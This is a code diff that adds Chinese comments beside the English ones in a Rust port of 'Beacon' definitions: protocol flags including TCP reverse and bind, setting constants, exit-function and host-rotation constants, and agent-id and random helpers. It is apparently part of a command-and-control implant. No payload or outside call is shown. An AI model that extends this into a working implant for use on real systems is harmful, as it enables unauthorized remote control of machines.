@@ -1,6 +1,8 @@
+//! Beacon 主要定义（beacon.h 常量）以及原来位于 commands.cpp 的共享工具（bigger_rand、genagentid）。
 //! Beacon main definitions (beacon.h constants) and shared utilities that
 //! lived in commands.cpp (bigger_rand, genagentid).
 
+/// 协议标志。
 /// Protocol flags.
 pub const BEACON_PROTO_HTTP: u16 = 0x00;
 pub const BEACON_PROTO_DNS: u16 = 0x01;
@@ -9,6 +11,7 @@ pub const BEACON_PROTO_TCP_REVERSE: u16 = 0x04;
 pub const BEACON_PROTO_HTTPS: u16 = 0x08;
 pub const BEACON_PROTO_TCP_BIND: u16 = 0x10;
 
+/// 设置常量。
 /// Setting constants.
 pub const SETTING_PROTOCOL: usize = 1;
 pub const SETTING_PORT: usize = 2;
@@ -79,15 +82,18 @@ pub const SETTING_MAX_RETRY_STRATEGY_ATTEMPTS: usize = 71;
 pub const SETTING_MAX_RETRY_STRATEGY_INCREASE: usize = 72;
 pub const SETTING_MAX_RETRY_STRATEGY_DURATION: usize = 73;
 
+/// 退出函数。
 /// Exit funks.
 pub const EXIT_FUNK_PROCESS: u16 = 0;
 pub const EXIT_FUNK_THREAD: u16 = 1;
 
+/// 主机策略。
 /// Host strategies.
 pub const HOST_STRATEGY_ROUND_ROBIN: i32 = 0;
 pub const HOST_STRATEGY_RANDOM: i32 = 1;
 pub const HOST_STRATEGY_EVENT: i32 = 2;
 
+/// 生成代理 id（C++ 入口中的 `genagentid`；DNS beacon 将 1202 或入该值）。
 /// Generate an agent id (`genagentid` in the C++ entries; DNS beacon ORs
 /// 1202 into the value).
 pub fn genagentid() -> u32 {
@@ -99,6 +105,7 @@ pub fn genagentid() -> u32 {
     }
 }
 
+/// 安全随机（bigger_rand，源自 tomcrypt rng_get_bytes）。
 /// Secure random (bigger_rand, from tomcrypt rng_get_bytes).
 pub fn bigger_rand() -> u32 {
     let mut buf = [0u8; 4];
